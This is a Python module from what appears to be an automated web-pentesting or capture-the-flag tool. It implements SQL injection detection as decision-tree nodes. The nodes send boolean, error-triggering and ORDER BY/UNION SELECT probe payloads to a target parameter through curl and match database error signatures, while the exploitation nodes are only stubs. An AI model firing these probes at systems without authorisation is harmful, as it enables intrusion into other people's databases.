"""SQL Injection detection and exploitation trees (W-SQLi-Detect & W-SQLi-Exploit).

Implements the SQLi decision trees from detections.md:
- W-S.1: Check if parameter is reflected
- W-S.2: Boolean-based probes
- W-S.3: Error-based signatures
- W-S.4: Union-based hints
"""
from typing import Dict, Any, Optional, List
import logging
import re
import time

from lattice_mind.core.nodes import DecisionNode
from lattice_mind.core.types import (
    NodeResult, NodeStatus, VulnDescriptor, VulnType
)
from lattice_mind.adapters.curl_adapter import CurlAdapter

logger = logging.getLogger(__name__)


class SQLiDetectReflectionNode(DecisionNode):
    """W-S.1: Check if parameter is reflected in response."""
    
    def __init__(self):
        super().__init__("sqli_detect_reflection", "SQLi: Check Reflection")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Check if parameter is reflected."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(
                status=NodeStatus.FAILURE,
                error="No challenge or target parameter"
            )
        
        # Extract parameter name and endpoint
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing reflection on {endpoint}?{param_name}=TEST")
        
        try:
            # Send benign value
            url = f"{endpoint}?{param_name}=REFLECTION_TEST"
            result = self.curl.run(url, {})
            
            if result.get("error"):
                return NodeResult(
                    status=NodeStatus.FAILURE,
                    error=f"HTTP request failed: {result['error']}"
                )
            
            body = result.get("body", "")
            
            # Check if test value appears in response
            is_reflected = "REFLECTION_TEST" in body
            
            logger.info(f"[sqli] Reflection: {is_reflected}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "is_reflected": is_reflected,
                    "baseline_response": body,
                }
            )
        
        except Exception as e:
            logger.error(f"[sqli] Reflection check failed: {str(e)}")
            return NodeResult(
                status=NodeStatus.FAILURE,
                error=str(e)
            )
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS:
            return SQLiDetectBooleanNode()
        return None


class SQLiDetectBooleanNode(DecisionNode):
    """W-S.2: Boolean-based SQLi probes."""
    
    def __init__(self):
        super().__init__("sqli_detect_boolean", "SQLi: Boolean Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test boolean-based SQLi."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing boolean-based SQLi")
        
        try:
            # Baseline request
            url_baseline = f"{endpoint}?{param_name}=1"
            result_baseline = self.curl.run(url_baseline, {})
            baseline_body = result_baseline.get("body", "")
            baseline_len = len(baseline_body)
            
            # True condition
            url_true = f"{endpoint}?{param_name}=1' AND '1'='1"
            result_true = self.curl.run(url_true, {})
            true_body = result_true.get("body", "")
            true_len = len(true_body)
            
            # False condition
            url_false = f"{endpoint}?{param_name}=1' AND '1'='0"
            result_false = self.curl.run(url_false, {})
            false_body = result_false.get("body", "")
            false_len = len(false_body)
            
            # Analyze responses
            baseline_hash = hash(baseline_body)
            true_hash = hash(true_body)
            false_hash = hash(false_body)
            
            # If responses differ significantly, likely SQLi
            is_sqli = (true_hash != false_hash) or (true_len != false_len)
            
            logger.info(f"[sqli] Boolean test: {is_sqli}")
            logger.debug(f"[sqli] Baseline len={baseline_len}, True len={true_len}, False len={false_len}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "is_boolean_sqli": is_sqli,
                    "response_diff": true_len != false_len,
                }
            )
        
        except Exception as e:
            logger.error(f"[sqli] Boolean test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_boolean_sqli"):
                return SQLiExploitBooleanNode()
            else:
                return SQLiDetectErrorNode()
        return None


class SQLiDetectErrorNode(DecisionNode):
    """W-S.3: Error-based SQLi signatures."""
    
    def __init__(self):
        super().__init__("sqli_detect_error", "SQLi: Error-Based Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test error-based SQLi."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing error-based SQLi")
        
        # Error signatures to look for
        error_patterns = [
            r"SQL syntax",
            r"near '",
            r"sqlite_error",
            r"pg_query",
            r"MySQL",
            r"ORA-\d+",  # Oracle
            r"MSSQL",
            r"syntax error",
        ]
        
        try:
            # Send payload that should cause SQL error
            url = f"{endpoint}?{param_name}=1'"
            result = self.curl.run(url, {})
            body = result.get("body", "")
            
            # Check for error signatures
            found_errors = []
            for pattern in error_patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    found_errors.append(pattern)
            
            is_error_sqli = len(found_errors) > 0
            
            logger.info(f"[sqli] Error-based test: {is_error_sqli}")
            if found_errors:
                logger.debug(f"[sqli] Found error signatures: {found_errors}")
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={
                    "is_error_sqli": is_error_sqli,
                    "error_signatures": found_errors,
                }
            )
        
        except Exception as e:
            logger.error(f"[sqli] Error test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))
    
    def next_node(self, result: NodeResult) -> Optional[DecisionNode]:
        if result.status == NodeStatus.SUCCESS:
            if result.data.get("is_error_sqli"):
                return SQLiExploitErrorNode()
            else:
                return SQLiDetectUnionNode()
        return None


class SQLiDetectUnionNode(DecisionNode):
    """W-S.4: Union-based SQLi hints."""
    
    def __init__(self):
        super().__init__("sqli_detect_union", "SQLi: Union-Based Probes")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Test union-based SQLi."""
        challenge = context.get("challenge")
        target_param = context.get("target_param")
        
        if not challenge or not target_param:
            return NodeResult(status=NodeStatus.FAILURE, error="Missing context")
        
        param_name = target_param.get("name")
        endpoint = target_param.get("endpoint", challenge.url)
        
        logger.info(f"[sqli] Testing union-based SQLi")
        
        try:
            # Try ORDER BY to find column count
            for cols in range(1, 6):
                url = f"{endpoint}?{param_name}=1 ORDER BY {cols}"
                result = self.curl.run(url, {})
                status = result.get("status", 0)
                
                if status == 500:
                    logger.info(f"[sqli] Found column count: {cols - 1}")
                    col_count = cols - 1
                    
                    # Try UNION SELECT with found column count
                    union_payload = f"1 UNION SELECT {','.join(['NULL'] * col_count)}"
                    url_union = f"{endpoint}?{param_name}={union_payload}"
                    result_union = self.curl.run(url_union, {})
                    
                    return NodeResult(
                        status=NodeStatus.SUCCESS,
                        data={
                            "is_union_sqli": True,
                            "column_count": col_count,
                        }
                    )
            
            return NodeResult(
                status=NodeStatus.SUCCESS,
                data={"is_union_sqli": False}
            )
        
        except Exception as e:
            logger.error(f"[sqli] Union test failed: {str(e)}")
            return NodeResult(status=NodeStatus.FAILURE, error=str(e))


class SQLiExploitBooleanNode(DecisionNode):
    """Exploit boolean-based SQLi to extract data."""
    
    def __init__(self):
        super().__init__("sqli_exploit_boolean", "SQLi: Extract via Boolean")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Exploit boolean-based SQLi."""
        logger.info(f"[sqli] Exploiting boolean-based SQLi")
        
        # In real exploitation, would binary search for data
        # For now, just mark as exploitable
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={"exploitation": "boolean"}
        )


class SQLiExploitErrorNode(DecisionNode):
    """Exploit error-based SQLi to extract data."""
    
    def __init__(self):
        super().__init__("sqli_exploit_error", "SQLi: Extract via Errors")
        self.curl = CurlAdapter()
    
    def run(self, context: Dict[str, Any]) -> NodeResult:
        """Exploit error-based SQLi."""
        logger.info(f"[sqli] Exploiting error-based SQLi")
        
        # Error-based extraction would use CAST/EXTRACTVALUE/etc.
        # For now, mark as exploitable
        
        return NodeResult(
            status=NodeStatus.SUCCESS,
            data={"exploitation": "error"}
        )


# Summary
"""
SQL Injection Detection Trees (W-SQLi)

Detection nodes:
- W-S.1 (SQLiDetectReflectionNode) - Check parameter reflection
- W-S.2 (SQLiDetectBooleanNode) - Boolean-based detection
- W-S.3 (SQLiDetectErrorNode) - Error-based detection
- W-S.4 (SQLiDetectUnionNode) - Union-based detection

Exploitation nodes:
- SQLiExploitBooleanNode - Extract via boolean logic
- SQLiExploitErrorNode - Extract via error messages

Used by web reconnaissance tree to test ID-like parameters.
"""
